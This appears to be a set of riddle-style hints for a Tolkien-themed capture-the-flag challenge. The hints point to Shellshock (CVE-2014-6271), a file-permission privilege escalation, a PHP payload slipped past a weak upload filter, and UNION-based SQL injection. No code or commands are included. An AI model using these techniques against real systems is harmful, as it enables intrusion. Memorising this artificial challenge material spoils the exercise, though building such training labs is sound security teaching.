********** HINT A **********
The secret A is hidden deep down in the shadow of the Iron Fortress.

Although the gate used to be hard as a shell, nowadays it looks like it could easily crumble from a shock.

A marking at the base of the gate shows the number: 2014-6271. 

It seems like the housekeeper of the Iron Fortress forgot to upgrade the defences of his house.

Notes: Isengard, CVE 2014-6271 (AKA ShellShock)

********** HINT B **********
King of Edoras holds secret B hidden to everyone.

He keeps the secret in his private space where only him can access it.

Not even his very close elven friend - admin, who shares many secrets with the king - cannot access it.

However, while the king keeps an eye on his secret, he may overlook access restrictions to some other important files.

Find out how to control his friend - admin - and search some other interesting files to find out, how to bypass the king's guards.

Perhaps, you should start gathering other information about his friend somewhere else.

********** HINT C **********
Secret C is easily retrieved from lousy workers at the elven kingdom.

They barely check the outside of the incoming packages, let alone the insides.

All they do is check the outsides and look on the lable, which describes the insides.

Snuck a fake, possibly malicious package - a php script-like payload - through the input checkers and the secret is yours.

********** HINT D **********
The dark forest is a place of many webs and bugs, some of them hardly visible.

Those who can not find their way should verify themselves to the forest and the way shall be pointed to them.

Once you arrive to the right place, perhaps ask not only about items, but about the contents of the previous verification too.

Some say, the best way to approach this task is through union.

********** HINT E **********
On thing is for sure - you are always welcome here in the house of Elrond.

Your old friend said, that he has an interesting artefact.

A chest with a damaged lid - to a common bystander, this chest looks like a junk.

But Elrond is very persistent - he knows that the chest hides something.
